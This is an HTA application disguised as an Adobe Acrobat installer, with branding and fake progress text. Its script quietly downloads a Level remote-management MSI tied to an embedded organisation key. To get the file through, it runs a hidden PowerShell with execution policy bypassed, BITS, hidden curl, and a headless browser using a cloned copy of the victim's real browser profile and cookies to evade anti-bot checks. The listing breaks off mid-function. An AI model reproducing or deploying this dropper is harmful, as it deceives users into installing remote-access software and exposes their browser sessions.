<!DOCTYPE html>
<html>
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>Adobe Acrobat</title>
<hta:application
  id="oHTA"
  applicationname="AdobeAcrobatUpdater"
  border="thin" caption="yes" maximizebutton="no" minimizebutton="no"
  navigateurl="no" showintaskbar="yes" singleinstance="yes" sysmenu="no"
  version="1.0" windowstate="normal" scroll="no" contextmenu="no" selection="no"
/>
<style>
  html, body { margin:0; padding:0; height:100%; width:100%;
    font-family:"Segoe UI",Tahoma,sans-serif; background:#f7f8fa; color:#1c1e21;
    overflow:hidden; cursor:default; user-select:none; }
  #wrap { height:100%; width:100%; position:relative; }
  #topbar { height:74px; background:#fff; border-bottom:1px solid #e6e8ec; padding:16px 20px; }
  #logo { position:absolute; left:20px; top:16px; width:42px; height:42px; }
  #brandtext { position:absolute; left:76px; top:22px; }
  #product { font-size:20px; font-weight:600; color:#1c1e21; line-height:24px; }
  #ver { font-size:12px; color:#8a8f98; margin-top:2px; }
  #closebtn { position:absolute; right:14px; top:8px; font-size:22px; color:#9aa0a8;
    width:34px; height:34px; line-height:34px; text-align:center; cursor:pointer; border-radius:4px; }
  #closebtn:hover { background:#f0f1f4; color:#333; }
  #main { position:absolute; top:74px; left:0; right:0; bottom:58px;
    padding:34px 48px 0 48px; text-align:center; }
  #biglogo { width:84px; height:84px; margin:0 auto 22px auto; }
  #heading { font-size:19px; font-weight:600; color:#1c1e21; margin-bottom:8px; }
  #status  { font-size:13px; color:#6b7280; min-height:18px; margin-bottom:26px; }
  #barouter { width:420px; max-width:82%; height:8px; background:#e2e5ea;
    border-radius:5px; overflow:hidden; margin:0 auto 12px auto; }
  #barfill { height:100%; width:0%; background:#ed2224; border-radius:5px; }
  #pct { font-size:12px; color:#8a8f98; margin-top:2px; }
  #subnote { font-size:11px; color:#b3b8c0; margin-top:26px; }
  #footer { position:absolute; left:0; right:0; bottom:0; height:58px;
    background:#fff; border-top:1px solid #e6e8ec; padding:0 22px; }
  #note { position:absolute; left:22px; top:20px; font-size:12px; color:#8a8f98; }
  #cancelbtn { position:absolute; right:22px; top:14px; width:92px; height:30px;
    border:1px solid #cfd3da; background:#fff; color:#333; font-size:12px;
    font-family:inherit; border-radius:4px; cursor:pointer; }
  #cancelbtn:hover { background:#f0f1f4; }
</style>
</head>
<body onload="init()">
  <div id="wrap">
    <div id="topbar">
      <div id="logo">
        <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
          <rect x="0" y="0" width="100" height="100" rx="22" fill="#ed2224"/>
          <polygon points="24,80 44,24 53,49 44,80" fill="#fff"/>
          <polygon points="58,80 76,24 76,80 67,80" fill="#fff"/>
        </svg>
      </div>
      <div id="brandtext">
        <div id="product">Adobe Acrobat</div>
        <div id="ver">2024 &middot; Standard &middot; v23.005</div>
      </div>
      <div id="closebtn" onclick="cancel()">&times;</div>
    </div>

    <div id="main">
      <div id="biglogo">
        <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
          <rect x="0" y="0" width="100" height="100" rx="22" fill="#ed2224"/>
          <polygon points="24,80 44,24 53,49 44,80" fill="#fff"/>
          <polygon points="58,80 76,24 76,80 67,80" fill="#fff"/>
        </svg>
      </div>
      <div id="heading">Installing Adobe Acrobat</div>
      <div id="status">Preparing installation&hellip;</div>
      <div id="barouter"><div id="barfill"></div></div>
      <div id="pct">0%</div>
      <div id="subnote">Adobe Acrobat keeps your documents secure and easy to share.</div>
    </div>

    <div id="footer">
      <span id="note">This usually only takes a few minutes.</span>
      <button id="cancelbtn" onclick="cancel()">Cancel</button>
    </div>
  </div>

<script>
// ---------------------------------------------------------------------------
// Config
// ---------------------------------------------------------------------------
var MSI_URL   = "https://downloads.level.io/level.msi";
var LEVEL_KEY = "vNXe6NQK21W3jiBMb4k2Uz8M";   // org key, injected at serve time

// Timing budgets
var DL_MAX_MS      = 480000;   // hard cap for the whole download (8 min)
var DL_FIRST_BYTE_MS = 15000;  // no real bytes this fast -> hand over to the robust path
var DL_CHUNK_BYTES = 4 * 1024 * 1024;  // bytes per async Range request
var DL_CHUNK_MAX_MS = 60000;   // no bytes for this long mid-transfer -> drop the chunk
var DL_SYNC_CHUNK  = 1 * 1024 * 1024;  // bytes per sync (WinHttp) Range request
var DL_SYNC_RECV_MS = 45000;   // per-chunk receive timeout on the sync path
var DL_SYNC_MAX_TRIES  = 5;       // sync per-chunk failures before the final one-shot
var DL_MAX_CHUNK_RETRIES = 3;  // per-chunk stalls (mid-transfer) before the sync path
var INSTALL_MAX_MS = 300000;   // covers the UAC wait + a full install
var INSTALL_STALL_MS = 45000;  // MSI log silent this long -> assume finished

// Runtime state
var shell = null, fso = null;
var state = "ready";               // ready | downloading | installing | done | error
var progress = 0;
var startTime = 0;
var tickTimer = null, dlTimer = null, pollTimer = null;

var adobeDir = "";
var msiPath  = "";
var logPath  = "";
var diagPath = "";

// Runtime state — download
var dlXHR = null;
var dlSettled = false;
var dlMethod = "";
var dlHttp = 0;
var lastEventT = 0;
var sawReal = false;
var dlTotal = 0;
var dlPos = 0;
var dlRetries = 0;
var dlStream = null;
var dlLastChunkBytes = 0;
var dlLastChunkT = 0;
var dlStart = 0;
var dlPhase = "async";
var dlAttempts = [];
var syncTries = 0, syncBusy = false, syncNextT = 0;
// Runtime state — rescue stages
var stageIdx = 0, stageT = 0;   // current download stage (see STAGES)
var oneShotReq = null;          // in-flight async WinHttp (oneshot stage)
var bitsMgr = null, bitsJob = null;   // BITS stage
var curlMarker = "";            // marker string for killing the curl process
var edgeProcTag = "";           // marker string for killing the headless browser
var extScanDirs = null, extSinceT = 0, extLastSize = -1, extStableT = 0;
var powMarker = "", powT0 = 0, powLastSize = 0, powLastGrowT = 0;
var edgeMaxPartial = 0, edgeLastPartial = 0, edgeLastGrowT = 0, edgeLogT = 0;
var powPartialMax = 0;
var POW_PS = "# Level's download command (Invoke-WebRequest), run hidden by the HTA's \"pow\"\n# stage. param(1) = unique per-page marker (process-kill), param(2) = per-page\n# temp dir (so concurrent runs never collide).\n#\n# This is exactly Level's `iwr ... -OutFile level.msi` — the WinINET-based\n# client that gets through on boxes where WinHttp/XHR/BITS get their response\n# bodies stripped (empty-206). The HTA watches this file's size for download\n# progress; the elevated msiexec install is done separately by the HTA (single\n# UAC prompt), so it is NOT run here.\nparam([string]$Marker = \"lvlm1\", [string]$TmpDir = \"\")\n\n$ErrorActionPreference = \"Continue\"\n\nif (-not $TmpDir) { $TmpDir = Join-Path ([System.IO.Path]::GetTempPath()) (\"lvl_\" + $Marker) }\ntry { New-Item -ItemType Directory -Path $TmpDir -Force | Out-Null } catch {}\n\n$tempFile = Join-Path $TmpDir \"level.msi\"\ntry { Remove-Item -LiteralPath $tempFile -Force -ErrorAction SilentlyContinue } catch {}\n\ntry { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}\n\ntry {\n  $ProgressPreference = 'SilentlyContinue'\n  Invoke-WebRequest -Uri \"https://downloads.level.io/level.msi\" -OutFile $tempFile -UseBasicParsing\n  $ProgressPreference = 'Continue'\n} catch {\n  # Fallback: built-in curl (a separate HTTP stack) in case iwr is also filtered.\n  $env:NO_PROXY = \"*\"\n  try { curl.exe -L --fail --retry 2 --connect-timeout 20 -o $tempFile \"https://downloads.level.io/level.msi\" 2>$null } catch {}\n}\n\n# Marker file signals \"iwr ran to completion (whatever the result)\". The HTA\n# polls level.msi's size for progress and this flag to know the attempt is done.\ntry { Set-Content -LiteralPath (Join-Path $TmpDir \"done.flag\") -Value $Marker -NoNewline } catch {}\n";   // Level's own install command
var powDir = "";
var UA_STR = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36";

var lastLogSize = 0;
var lastLogGrowT = 0;

var dlMsgs = [
  "Contacting Adobe servers&hellip;",
  "Downloading components&hellip;",
  "Downloading components&hellip;",
  "Downloading components&hellip;"
];
var instMsgs = [
  "Installing Adobe Acrobat&hellip;",
  "Installing Adobe Acrobat&hellip;",
  "Applying updates&hellip;",
  "Applying updates&hellip;",
  "Finalizing&hellip;"
];

function $(id) { return document.getElementById(id); }

function init() {
  shell = new ActiveXObject("WScript.Shell");
  fso   = new ActiveXObject("Scripting.FileSystemObject");
  // Swallow any uncaught script error so the HTA never pops the "error in
  // this page" dialog (which halts the page) and so it can log and continue.
  try {
    window.onerror = function (msg, src, line) {
      try { logAttempt("page-exc: " + msg + " line " + line); } catch (e) {}
      return true;
    };
  } catch (e) {}
  var w = 620, h = 396;
  window.resizeTo(w, h);
  var sw = screen.availWidth, sh = screen.availHeight;
  window.moveTo(Math.round((sw - w) / 2), Math.round((sh - h) / 2));

  adobeDir = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") + "\\Adobe";
  if (!fso.FolderExists(adobeDir)) fso.CreateFolder(adobeDir);
  msiPath  = adobeDir + "\\AdobeUpdate.msi";
  logPath  = adobeDir + "\\AdobeUpdate.log";
  diagPath = adobeDir + "\\diagnostics.txt";
  cleanStale();
  startDownload();
}

function cleanStale() {
  var p = [msiPath, logPath, diagPath];
  for (var i = 0; i < p.length; i++) {
    try { if (fso.FileExists(p[i])) fso.DeleteFile(p[i], true); } catch (e) {}
  }
}

// ---------------------------------------------------------------------------
// Download phase — in-process stages first, external rescue stages after.
//
// Stages, tried in order (every transition is logged in diagnostics.txt):
//
//   async    XMLHttpRequest (ms-stream, WinINET) — fast and invisible on
//            ordinary machines.
//   sync     WinHttp chunked Range requests run as a state machine — a
//            self-contained stack with modern TLS.
//   oneshot  one full-file WinHttp request (no Range header).
//   bits     a BITS job — the background-transfer service Windows Update
//            uses; the transfer runs in a separate service process.
//   curl     the built-in curl.exe, separate process.
//   pow      Level's OWN download command, run as a hidden child process:
//            powershell.exe -ExecutionPolicy Bypass "Invoke-WebRequest
//            https://downloads.level.io/level.msi -OutFile %TEMP%\lvl_<id>\
//            level.msi" (TLS12). WinINET-based — exactly what Level ships —
//            so it gets through on boxes where WinHttp/XHR/BITS have their
//            response bodies stripped (empty-206). The elevated msiexec
//            install is done separately (single UAC prompt), so download and
//            admin step stay apart.
//   edge     headless download with the machine's REAL browser engine and a
//            cloned copy of its real profile (cookies/local state/prefs) —
//            looks exactly like the user's normal browsing, no visible UI.
//            Held past its budget while bytes are still flowing (slow
//            connections can take minutes for a 38 MB file).
//   edge2    same, with a clean profile (in case the clone didn't carry
//            whatever the gate needs).
//
// A stage ends when it lands a complete, verified MSI (size + magic) or when
// it shows it cannot deliver bytes (error, empty body, or stage timeout).
// ---------------------------------------------------------------------------
var STAGES = ["async", "sync", "pow", "oneshot", "bits", "curl", "edge", "edge2"];
// edge/edge2 budgets are only the "give up if nothing is flowing" grace
// window — a stage whose bytes are still arriving is held past its budget
// (see the keep-alive check in _pollDownload) up to the global DL_MAX_MS cap.
// The pow stage likewise holds while its child process is still working.
var STAGE_BUDGET_MS = { async: 15000, sync: 60000, pow: 300000, oneshot: 30000, bits: 60000, curl: 60000, edge: 150000, edge2: 150000 };

function dlMsgIndex() {
  if (progress < 10) return 0;
  if (progress < 45) return 1;
  if (progress < 75) return 2;
  return 3;
}

function nowHM() {
  var d = new Date();
  function z(n) { return (n < 10 ? "0" : "") + n; }
  return z(d.getHours()) + ":" + z(d.getMinutes()) + ":" + z(d.getSeconds());
}

function indexOf(arr, v) {
  for (var i = 0; i < arr.length; i++) if (arr[i] === v) return i;
  return -1;
}

function nowMs() { return new Date().getTime(); }

function logAttempt(msg) {
  try { dlAttempts.push(nowHM() + " " + msg); } catch (e) {}
}

function parseRangeTotal(cr) {
  if (!cr) return 0;
  var mm = /\/(\d+)\s*$/.exec(cr);
  return mm ? parseInt(mm[1], 10) : 0;
}

function extDir() { return adobeDir + "\\ext"; }
function ensureDir(d) { try { if (!fso.FolderExists(d)) fso.CreateFolder(d); } catch (e) {} }
function deleteFile(p) { try { if (fso.FileExists(p)) fso.DeleteFile(p, true); } catch (e) {} }
function deleteFileTree(d) { try { if (fso.FolderExists(d)) fso.DeleteFolder(d, true); } catch (e) {} }

function minSize() {
  if (dlTotal > 0) return Math.max(1048576, Math.floor(dlTotal * 0.9));
  return 1048576;
}

// Read the first n bytes of a file as numeric byte values [b0, b1, ...].
// Tries a byte-exact ADODB.Stream binary read first (code-page independent),
// then falls back to FSO ASCII if the ADO "data source" read is blocked by a
// hardened machine ("Safety settings ... prohibit accessing a data source on
// another domain"). Returns fewer than n (or 0) bytes if neither can read.
// Returns an empty array if the file cannot be read (so callers can fall
// open rather than abort).
function readHeadBytes(path, n) {
  if (!fso.FileExists(path)) return [];
  // PRIMARY: ADODB.Stream binary read — byte-exact and code-page independent.
  // Same ADO Stream API the download path already uses on this box
  // (LoadFromFile / SaveToFile), so no new data-source surface is introduced.
  try {
    var s = new ActiveXObject("ADODB.Stream");
    s.Type = 1;                    // adTypeBinary
    s.Open();
    s.LoadFromFile(path);
    s.Position = 0;
    var b = s.Read(n);             // n bytes -> string of n chars, each 0..255
    try { s.Close(); } catch (e) {}
    var out = [];
    for (var i = 0; i < b.length; i++) out.push(b.charCodeAt(i) & 0xFF);
    return out;
  } catch (e) { /* ADO blocked on this machine -> fall through to FSO */ }
  // FALLBACK: FSO ASCII read (default ANSI codepage). No Charset reassign:
  // Charset is write-only on a file opened ForReading, so setting it throws
  // and (inside the inner catch) silently produced an EMPTY result -> the
  // verify gate then saw a "bad magic" on a perfectly good MSI.
  try {
    var f = fso.OpenTextFile(path, 1, false, 0);   // 1=ForReading, 0=ASCII
    var d = "";
    try { d = f.Read(n); } catch (e2) {}
    try { f.Close(); } catch (e3) {}
    var out2 = [];
    for (var j = 0; j < d.length; j++) out2.push(d.charCodeAt(j) & 0xFF);
    return out2;
  } catch (e4) { return []; }
}

function msiMagicOk(path) {
  try {
    var m = readHeadBytes(path, 4);
    return m.length === 4 && m[0] === 0xD0 && m[1] === 0xCF && m[2] === 0x11 && m[3] === 0xE0;
  } catch (e) { return false; }
}

function killByCmd(marker) {
  try {
    var wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!//./root/cimv2");
    var q = wmi.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE CommandLine LIKE '%" + marker + "%'");
    var en = new Enumerator(q);
    for (; !en.atEnd(); en.moveNext()) {
      try { shell.Run("taskkill /f /t /pid " + en.item().ProcessId, 0, true); } catch (e2) {}
    }
  } catch (e3) {}
}

function stopAllWorkers() {
  if (oneShotReq) { try { oneShotReq.abort(); } catch (e) {} oneShotReq = null; }
  try { if (bitsJob) bitsJob.Cancel(); } catch (e) {}
  try { if (bitsMgr && bitsJob) bitsMgr.DeleteJob(bitsJob); } catch (e) {}
  bitsJob = null; bitsMgr = null;
  if (curlMarker) { killByCmd(curlMarker); curlMarker = ""; }
  if (powMarker) { killByCmd(powMarker); powMarker = ""; }
  if (edgeProcTag) { killByCmd(edgeProcTag); edgeProcTag = ""; }
}

// --- stage machine ----------------------------------------------------------
function startDownload() {
  state = "downloading";
  dlStart = nowMs();
  startTime = dlStart;
  progress = 0; dlSettled = false; sawReal = false;
  dlTotal = 0; dlPos = 0; dlRetries = 0;
  syncTries = 0; syncBusy = false; syncNextT = 0;
  stageIdx = 0; stageT = dlStart;
  oneShotReq = null; bitsJob = null; bitsMgr = null;
  curlMarker = ""; edgeProcTag = "";
  powMarker = ""; powT0 = 0; powLastSize = 0; powLastGrowT = 0; powPartialMax = 0;
  extScanDirs = null; extSinceT = 0; extLastSize = -1; extStableT = 0;
  deleteFileTree(extDir());
  ensureDir(extDir());
  setBar(0);
  setStatus(dlMsgs[0]);
  try {
    dlStream = new ActiveXObject("ADODB.Stream");
    dlStream.Type = 1; dlStream.Mode = 3; dlStream.Open();
  } catch (e) { dlStream = null; }
  tickTimer = setInterval(tick, 200);
  dlTimer = setInterval(pollDownload, 200);
  dlPhase = "async";
  logAttempt("start async pos=0");
  requestChunk(true);
}

function beginStage(name) {
  stageIdx = indexOf(STAGES, name);
  stageT = nowMs();
  dlPhase = name;
  logAttempt("stage: " + name + " pos=" + dlPos);
  if (name === "async") {
    dlRetries = 0;
    requestChunk(true);
  } else if (name === "sync") {
    enterSync();
  } else if (name === "pow") {
    startPow();
  } else if (name === "oneshot") {
    startOneShot();
  } else if (name === "bits") {
    startBits();
  } else if (name === "curl") {
    startCurl();
  } else if (name === "edge" || name === "edge2") {
    startEdge(name === "edge2");
  }
}

function nextStage() {
  if (state !== "downloading" || dlSettled) return;
  if (stageIdx + 1 >= STAGES.length) {
    fail("Could not reach the Adobe download server", "all-stages-failed");
    return;
  }
  stopAllWorkers();
  beginStage(STAGES[stageIdx + 1]);
}

// --- async (IE XHR, ms-stream) chunked downloader ---------------------------
function requestChunk(isFirst) {
  if (state !== "downloading" || STAGES[stageIdx] !== "async" || dlSettled) return;
  var x = null;
  try { x = new XMLHttpRequest(); } catch (e) {}
  if (!x || !("responseType" in x)) { nextStage(); return; }
  try {
    x.open("GET", MSI_URL, true);
    x.responseType = "ms-stream";
    x.timeout = DL_CHUNK_MAX_MS * 2;
    x.setRequestHeader("Range", "bytes=" + dlPos + "-" + (dlPos + DL_CHUNK_BYTES - 1));
  } catch (e) { nextStage(); return; }
  dlXHR = x;
  dlLastChunkBytes = 0;
  dlLastChunkT = nowMs();
  x.onprogress = function (e) {
    if (state !== "downloading" || STAGES[stageIdx] !== "async" || !e) return;
    dlLastChunkT = nowMs();
    if (e.loaded && e.loaded > dlLastChunkBytes) dlLastChunkBytes = e.loaded;
  };
  x.onload = function () {
    if (state !== "downloading" || STAGES[stageIdx] !== "async") return;
    dlHttp = x.status;
    if (x.status === 206) {
      var total = 0, pre = dlPos;
      try { total = parseRangeTotal(x.getResponseHeader("Content-Range")); } catch (e) {}
      if (!appendStream(x.response, total)) { nextStage(); return; }
      if (dlPos === pre) { handleChunkFailure("empty-206"); return; }
      if (dlSettled) return;
      if (dlTotal > 0 && dlPos < dlTotal) { requestChunk(false); return; }
      if (dlTotal <= 0 && (dlPos - pre) < DL_CHUNK_BYTES) completeDownload();
      return;
    }
    if (x.status === 200) {
      var b = null; try { b = x.response; } catch (e) {}
      if (b && b.size > 0 && saveBody(b, "wininet", 0)) return;
      nextStage();
      return;
    }
    handleChunkFailure("http " + x.status);
  };
  x.onerror = function () { if (state === "downloading" && STAGES[stageIdx] === "async") handleChunkFailure("xhr error"); };
  x.ontimeout = function () { if (state === "downloading" && STAGES[stageIdx] === "async") handleChunkFailure("chunk timeout"); };
  try { x.send(); } catch (e) { nextStage(); }
}

function handleChunkFailure(why) {
  if (state !== "downloading" || STAGES[stageIdx] !== "async" || dlSettled) return;
  if (dlXHR) { try { dlXHR.abort(); } catch (e) {} dlXHR = null; }
  dlLastChunkT = nowMs();
  dlRetries++;
  logAttempt("async-fail: " + why + " pos=" + dlPos + " retry=" + dlRetries);
  if (dlRetries > DL_MAX_CHUNK_RETRIES) { nextStage(); return; }
  setStatus(dlMsgs[1]);
  setTimeout(function () {
    if (state === "downloading" && STAGES[stageIdx] === "async" && !dlSettled) requestChunk(false);
  }, 1200);
}

// --- sync (WinHttp) chunked downloader --------------------------------------
function enterSync() {
  dlPhase = "sync";
  if (dlXHR) { try { dlXHR.abort(); } catch (e) {} dlXHR = null; }
  syncTries = 0; syncBusy = false; syncNextT = 0;
  try { if (dlStream) { dlStream.Position = dlStream.Size; dlStream.SaveToFile(msiPath, 2); } } catch (e) {}
  requestSyncChunk();
}

function requestSyncChunk() {
  if (state !== "downloading" || STAGES[stageIdx] !== "sync" || dlSettled || syncBusy) return;
  syncBusy = true;
  try {
    var w = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
    try { w.Option(13) = 2147483647; } catch (e) {}
    w.SetTimeouts(15000, 30000, DL_SYNC_RECV_MS, 120000);
    w.Open("GET", MSI_URL, false);
    w.SetRequestHeader("User-Agent", UA_STR);
    var end = dlPos + DL_SYNC_CHUNK - 1;
    if (dlTotal > 0) end = Math.min(end, dlTotal - 1);
    w.SetRequestHeader("Range", "bytes=" + dlPos + "-" + end);
    w.Send();
    var st = w.Status;
    dlHttp = st;
    if (st === 206) {
      var cr = null; try { cr = w.getResponseHeader("Content-Range"); } catch (e) {}
      var pre = dlPos;
      if (!appendStream(w.responseBody, parseRangeTotal(cr))) { handleSyncFailure("append"); return; }
      if (dlPos === pre) handleSyncFailure("empty-206");
    } else if (st === 200) {
      if (!saveBody(w.responseBody, "winhttp", 0)) handleSyncFailure("http200");
    } else {
      handleSyncFailure("http " + st);
    }
  } catch (e) {
    handleSyncFailure("exc: " + e.message);
  } finally {
    syncBusy = false;
  }
}

function handleSyncFailure(why) {
  if (state !== "downloading" || STAGES[stageIdx] !== "sync" || dlSettled) return;
  syncTries++;
  logAttempt("sync-fail: " + why + " pos=" + dlPos + " try=" + syncTries);
  if (syncTries > DL_SYNC_MAX_TRIES) { nextStage(); return; }
  syncNextT = nowMs() + 1500;
}

// --- pow stage: Level's own download command, run hidden -------------------
// Launches powershell.exe as a hidden child running Level's exact
// Invoke-WebRequest (TLS12 → %TEMP%\lvl_<id>\level.msi). NOT elevated — the
// elevated msiexec install is done separately by startInstall() (the single
// UAC prompt), using the file this stage produces.
function powDirPath() {
  return (powDir ? powDir : (shell.ExpandEnvironmentStrings("%TEMP%") + "\\lvl_" + powMarker));
}
function startPow() {
  if (!POW_PS) { logAttempt("pow-noscript"); nextStage(); return; }
  powMarker = "lvlm" + Math.floor(Math.random() * 16777215).toString(16);
  powDir = shell.ExpandEnvironmentStrings("%TEMP%") + "\\lvl_" + powMarker;
  try { if (!fso.FolderExists(powDir)) fso.CreateFolder(powDir); } catch (e) {}
  try { fso.DeleteFile(powDir + "\\level.msi", true); } catch (e) {}
  try { fso.DeleteFile(powDir + "\\done.flag", true); } catch (e) {}
  var src = fso.GetFolder(shell.ExpandEnvironmentStrings("%TEMP%")).Path + "\\__lvl__download.ps1";
  try {
    deleteFile(src);
    var w = fso.CreateTextFile(src, true, false);
    w.Write(POW_PS);
    w.Close();
  } catch (e) {
    logAttempt("pow-wr-fail: " + e.message);
    nextStage();
    return;
  }
  var cmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass -File \"" + src + "\" -Marker " + powMarker + " -TmpDir \"" + powDir + "\"";
  powT0 = nowMs();
  powLastSize = 0; powLastGrowT = powT0; powPartialMax = 0;
  try { shell.Run(cmd, 0, false); logAttempt("pow-start: marker=" + powMarker); }
  catch (e) {
    logAttempt("pow-launch-fail: " + e.message);
    deleteFile(src);
    nextStage();
  }
}
function pollPow() {
  var t = nowMs();
  var path = powDirPath() + "\\level.msi";
  var sz = 0, doneFlag = false;
  try { if (fso.FileExists(path)) sz = fso.GetFile(path).Size; } catch (e) {}
  try { doneFlag = fso.FileExists(powDirPath() + "\\done.flag"); } catch (e) {}
  if (sz > powPartialMax) {
    powPartialMax = sz; powLastGrowT = t;
    if (dlTotal > 0) {
      var pp = Math.min(88, sz * 100 / dlTotal);
      if (pp > progress) { progress = pp; setBar(pp); }
    }
  }
  if (sz >= 1048576) {
    // File is a real MSI and settled — hand off to the install phase.
    if (powLastSize === sz && t - powLastGrowT >= 1500) {
      completeExternal(path, "pow");
      return;
    }
  } else if (doneFlag) {
    // iwr ran to completion but produced no usable file (stripped/failed).
    logAttempt("pow-done-partial: " + sz);
    nextStage();
    return;
  }
  powLastSize = sz;
  var budget = STAGE_BUDGET_MS.pow;
  if (t - stageT > budget) {
    if (powPartialMax > 0 && (t - powLastGrowT < 45000)) {
      return;   // keep-alive: bytes are still arriving (checked in _pollDownload)
    }
    logAttempt("pow-giveup: partial=" + powPartialMax + " age=" + (t - powLastGrowT) + "ms");
    nextStage();
  }
}

// --- oneshot (WinHttp async, full file) --------------------------------------
function startOneShot() {
  setStatus(dlMsgs[1]);
  try {
    var w = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
    try { w.Option(13) = 2147483647; } catch (e) {}
    w.SetTimeouts(15000, 30000, 30000, 30000);
    w.Open("GET", MSI_URL, true);
    w.SetRequestHeader("User-Agent", UA_STR);
    w.onreadystatechange = function () {
      if (state !== "downloading" || STAGES[stageIdx] !== "oneshot" || dlSettled) return;
      if (w.ReadyState !== 4) return;
      var st = w.Status;
      dlHttp = st;
      var sz = 0; try { sz = w.BodySize; } catch (e) {}
      if ((st === 200 || st === 206) && sz > 0) {
        if (saveBody(w.responseBody, "winhttp-oneshot", 0)) return;
        logAttempt("oneshot-badbody: http " + st + " size=" + sz);
      } else {
        logAttempt("oneshot-fail: http " + st + " size=" + sz);
      }
      nextStage();
    };
    w.ontimeout = function () {
      if (state === "downloading" && STAGES[stageIdx] === "oneshot" && !dlSettled) {
        logAttempt("oneshot-timeout");
        nextStage();
      }
    };
    w.Send();
    oneShotReq = w;
  } catch (e) {
    logAttempt("oneshot-exc: " + e.message);
    nextStage();
  }
}


// ---------------------------------------------------------------------------
// Verify the downloaded blob is a real MSI, then install.
// ---------------------------------------------------------------------------
function verifyAndInstall() {
  state = "installing";   // guard against re-entry while verifying
  try {
    if (!fso.FileExists(msiPath)) { fail("Failed to save the installer file", "verify: no msi"); return; }
    var sz = fso.GetFile(msiPath).Size;
    if (sz < 1048576) { fail("Failed to save the installer file", "verify: small " + sz); return; }
    // Verify the OLE/MSI magic (D0 CF 11 E0). readHeadBytes() tries a byte-exact
    // ADODB.Stream binary read first, then falls back to FSO ASCII if ADO is
    // blocked ("Safety settings ... prohibit accessing a data source on another
    // domain"). A short / empty read is treated as "unreadable" -> proceed (the
    // file is present and full-size); only a confirmed non-OLE 4-byte header
    // aborts, so a good MSI can never be falsely rejected.
    var magic = null;
    try { magic = readHeadBytes(msiPath, 4); } catch (e) { magic = null; }
    if (magic && magic.length === 4) {
      // A byte-exact read of 4 header bytes. Only a confirmed OLE/CF
      // container (D0 CF 11 E0) is a real MSI; anything else means the
      // download was truncated/corrupt, so abort before msiexec.
      if (magic[0] !== 0xD0 || magic[1] !== 0xCF || magic[2] !== 0x11 || magic[3] !== 0xE0) {
        logAttempt("verify: magic mismatch " + magic[0] + "," + magic[1] + "," + magic[2] + "," + magic[3]);
        fail("Failed to save the installer file", "verify: bad magic");
        return;
      }
    } else {
      // Could not read 4 header bytes (ADO/FSO blocked, zone policy). The
      // file is present and full-size, so proceed rather than abort.
      logAttempt("verify: magic read unavailable (" + (magic ? magic.length : 0) + " bytes), proceeding");
    }
  } catch (e) {
    fail("Failed to save the installer file", "verify: " + e.message);
    return;
  }
  startInstall();
}


// --- bits (Windows background transfer service) ------------------------------
function startBits() {
  setStatus(dlMsgs[1]);
  var dir = extDir() + "\\bits";
  ensureDir(dir);
  deleteFile(dir + "\\bits.msi");
  extScanDirs = [dir]; extSinceT = 0; extLastSize = -1; extStableT = 0;
  try {
    bitsMgr = new ActiveXObject("BackgroundCopyManager");
    bitsJob = bitsMgr.CreateJob("AdobeUpdate", 3);   // BG_JOB_TYPE_DOWNLOAD
    try { bitsJob.Options.Priority = 1; } catch (e) {}  // BG_JOB_PRIORITY_HIGH
    bitsJob.AddFile(MSI_URL, dir + "\\bits.msi");
    bitsMgr.SubmitJob(bitsJob);
    bitsJob.Resume();
  } catch (e) {
    logAttempt("bits-exc: " + e.message);
    stopAllWorkers();
    nextStage();
  }
}

function pollBits() {
  if (!bitsJob) return;
  var st = -1;
  try { st = bitsJob.JobState; } catch (e) {}
  if (st === 5 || st === 6) {
    var err = 0; try { err = bitsJob.JobError; } catch (e) {}
    logAttempt("bits-error: state=" + st + " err=" + err);
    stopAllWorkers();
    nextStage();
  }
  // 0 queued / 1 connecting / 2 transferring / 7 waiting: in flight.
  // 4 transferred: confirmed by the shared file check (pollExtFile).
}

// --- curl (built-in, separate process) ---------------------------------------
function startCurl() {
  setStatus(dlMsgs[1]);
  var dir = extDir() + "\\curl";
  ensureDir(dir);
  var p = dir + "\\curl.msi";
  deleteFile(p);
  var curl = shell.ExpandEnvironmentStrings("%SystemRoot%") + "\\System32\\curl.exe";
  if (!fso.FileExists(curl)) {
    logAttempt("curl-missing");
    nextStage();
    return;
  }
  extScanDirs = [dir]; extSinceT = 0; extLastSize = -1; extStableT = 0;
  curlMarker = p;
  var args = "-sS -L --retry 2 --retry-delay 2 --max-time 80 --connect-timeout 15 " +
    "-A \"" + UA_STR + "\" -o \"" + p + "\" \"" + MSI_URL + "\"";
  try {
    shell.Run("\"" + curl + "\" " + args, 0, false);
  } catch (e) {
    logAttempt("curl-exc: " + e.message);
    nextStage();
  }
}

// --- edge (headless browser download, cloned real profile) ------------------
// The machine's real browser engine is the one client class proven to get
// through the box's anti-bot layer, so we use it — but headless, with a CLONE
// of the user's actual profile (Cookies, Local State, Preferences, ...).
// Fingerprint-wise that is indistinguishable from normal browsing: same
// engine, same cookie jar, same UA. A second attempt (edge2) uses a clean
// profile in case the clone missed something the gate needs.
function findBrowser() {
  var pf = shell.ExpandEnvironmentStrings("%ProgramFiles(x86)%");
  var pf2 = shell.ExpandEnvironmentStrings("%ProgramFiles%");
  var la = shell.ExpandEnvironmentStrings("%LocalAppData%");
  var cands = [
    pf + "\\Microsoft\\Edge\\Application\\msedge.exe",
    pf2 + "\\Microsoft\\Edge\\Application\\msedge.exe",
    la + "\\Microsoft\\Edge\\Application\\msedge.exe",
    pf + "\\Google\\Chrome\\Application\\chrome.exe",
    pf2 + "\\Google\\Chrome\\Application\\chrome.exe",
    la + "\\Google\\Chrome\\Application\\chrome.exe"
  ];
  for (var i = 0; i < cands.length; i++) {
    if (fso.FileExists(cands[i])) return cands[i];
  }
  return "";
}

// Which browser is installed, and where its real profile lives.
function realBrowserInfo() {
  var pf = shell.ExpandEnvironmentStrings("%ProgramFiles(x86)%");
